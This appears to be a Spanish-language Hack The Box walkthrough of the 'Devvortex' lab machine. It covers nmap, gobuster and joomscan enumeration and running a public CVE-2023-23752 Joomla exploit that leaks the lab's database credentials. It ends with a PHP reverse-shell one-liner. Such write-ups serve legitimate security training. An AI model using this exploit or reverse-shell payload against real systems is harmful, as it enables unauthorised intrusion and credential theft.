Maquina devvortex Hack the Box

ip: 10.10.11.242

fase de reconocimiento

❯ ping -c 1 10.10.11.242
PING 10.10.11.242 (10.10.11.242) 56(84) bytes of data.
64 bytes from 10.10.11.242: icmp_seq=1 ttl=63 time=86.5 ms

--- 10.10.11.242 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.524/86.524/86.524/0.000 ms


podemos definir que se trata de una maquina linux por tu ttl = 63

procedemos a escanear puertos:

❯ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.242 -oG Puertos
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 19:03 CST
Initiating SYN Stealth Scan at 19:03
Scanning 10.10.11.242 [65535 ports]
Discovered open port 22/tcp on 10.10.11.242
Discovered open port 80/tcp on 10.10.11.242
Completed SYN Stealth Scan at 19:03, 13.21s elapsed (65535 total ports)
Nmap scan report for 10.10.11.242
Host is up, received user-set (0.088s latency).
Scanned at 2023-12-11 19:03:35 CST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
           Raw packets sent: 65578 (2.885MB) | Rcvd: 65578 (2.623MB)


❯ nmap -sCV -p22,80 10.10.11.242 -oN Targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 19:04 CST
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.94 seconds

whatweb 10.10.11.242
http://10.10.11.242 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], RedirectLocation[http://devvortex.htb/], Title[302 Found], nginx[1.18.0]

se agrega a el /etc/hosts la ip y el dominio devvortex.htb

repetimos el comando 
❯ whatweb 10.10.11.242
http://10.10.11.242 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], RedirectLocation[http://devvortex.htb/], Title[302 Found], nginx[1.18.0]
http://devvortex.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]

ingresamos en nuetro navegador a: http://devvortex.htb


utilizamos la herramienta gobuster para enumerar directorios y subdominios

❯ gobuster dir -u devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================

gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devortex.htb

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================


agregamos a el /etc/hosts el nuevo subdominio dev.devvortex.htb

realizamos con gobuster otro reconocimineto de directorios 

❯ gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 403) [Size: 162]
/.cvs                 (Status: 403) [Size: 162]
/.git-rewrite         (Status: 403) [Size: 162]
/.config              (Status: 403) [Size: 162]
/.bashrc              (Status: 403) [Size: 162]
/.bash_history        (Status: 403) [Size: 162]
/.git                 (Status: 403) [Size: 162]
/.cvsignore           (Status: 403) [Size: 162]
/.cache               (Status: 403) [Size: 162]
/.git/config          (Status: 403) [Size: 162]
/.forward             (Status: 403) [Size: 162]
/.git_release         (Status: 403) [Size: 162]
/.git/index           (Status: 403) [Size: 162]
/.gitignore           (Status: 403) [Size: 162]
/.gitconfig           (Status: 403) [Size: 162]
/.gitkeep             (Status: 403) [Size: 162]
/.gitattributes       (Status: 403) [Size: 162]
/.git/logs/           (Status: 403) [Size: 162]
/.gitmodules          (Status: 403) [Size: 162]
/.gitreview           (Status: 403) [Size: 162]
/.gitk                (Status: 403) [Size: 162]
/.hta                 (Status: 403) [Size: 162]
/.history             (Status: 403) [Size: 162]
/.listing             (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.mysql_history       (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.listings            (Status: 403) [Size: 162]
/.passwd              (Status: 403) [Size: 162]
/.profile             (Status: 403) [Size: 162]
/.perf                (Status: 403) [Size: 162]
/.rhosts              (Status: 403) [Size: 162]
/.sh_history          (Status: 403) [Size: 162]
/.ssh                 (Status: 403) [Size: 162]
/.subversion          (Status: 403) [Size: 162]
/.svn/entries         (Status: 403) [Size: 162]
/.svn                 (Status: 403) [Size: 162]
/.swf                 (Status: 403) [Size: 162]
/.svnignore           (Status: 403) [Size: 162]
/.web                 (Status: 403) [Size: 162]
/administrator        (Status: 200) [Size: 12211]
/api                  (Status: 406) [Size: 29]
/api/experiments/configurations (Status: 406) [Size: 29]
/api/experiments      (Status: 406) [Size: 29]
/cache                (Status: 200) [Size: 31]
/components           (Status: 200) [Size: 31]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 200) [Size: 31]
/includes             (Status: 200) [Size: 31]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 200) [Size: 31]
/layouts              (Status: 200) [Size: 31]
/libraries            (Status: 200) [Size: 31]
/media                (Status: 200) [Size: 31]
/modules              (Status: 200) [Size: 31]
/plugins              (Status: 200) [Size: 31]
/robots.txt           (Status: 200) [Size: 764]
/templates            (Status: 200) [Size: 31]
/tmp                  (Status: 200) [Size: 31]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================


ingresamos a: http://dev.devvortex.htb/administrator/

podemos ver que el servicio se encuntra bajo es servicio de joomla
por lo que podemos usar joomscan

si no lo tines instalado lo hacemos con el siguiente comando sudo apt install joomscan

joomscam -u http://dev.devvortex.htb

    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.devvortex.htb/

realizamos una busqueda en google sobre algun exploit en joomla v4.2.6 

creamos un directorio fuera de nmap llamado exploits

❯ mkdir exploits
❯ cd exploits

copiamos el siguente repositorio 
❯ git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
Cloning into 'exploit-CVE-2023-23752'...
remote: Enumerating objects: 21, done.
remote: Counting objects: 100% (21/21), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 21 (delta 6), reused 15 (delta 3), pack-reused 0
Receiving objects: 100% (21/21), 74.70 KiB | 840.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
❯ ls
exploit-CVE-2023-23752

ingresamos
❯ cd exploit-CVE-2023-23752
❯ ls
assets  docker-compose.yml  exploit.rb  Gemfile  Gemfile.lock  LICENSE  README.md
❯ ruby exploit.rb http://dev.devvortex.htb
<internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:86:in `require': cannot load such file -- httpx (LoadError)
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:86:in `require'
        from exploit.rb:33:in `<main>'

instalamos la sigueinte dependencia

❯ gem install httpx docopt paint
Fetching httpx-1.1.5.gem
Fetching http-2-next-1.0.1.gem
Successfully installed http-2-next-1.0.1
Successfully installed httpx-1.1.5
Parsing documentation for http-2-next-1.0.1
Installing ri documentation for http-2-next-1.0.1
Parsing documentation for httpx-1.1.5
Installing ri documentation for httpx-1.1.5
Done installing documentation for http-2-next, httpx after 2 seconds
Fetching docopt-0.6.1.gem
Successfully installed docopt-0.6.1
Parsing documentation for docopt-0.6.1
Installing ri documentation for docopt-0.6.1
Done installing documentation for docopt after 0 seconds
Fetching paint-2.3.0.gem
Successfully installed paint-2.3.0
Parsing documentation for paint-2.3.0
Installing ri documentation for paint-2.3.0
Done installing documentation for paint after 0 seconds
4 gems installed

ejecutamos el exploit de la siguiente manera:

❯ ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered
[651] Roan (rnt) - qweqwe@qew.com - Super Users

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0


obtenemos el siguiente usuario y contrasena:

user: lewis
password: P4ntherg0t1n5r3c0n##


php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");
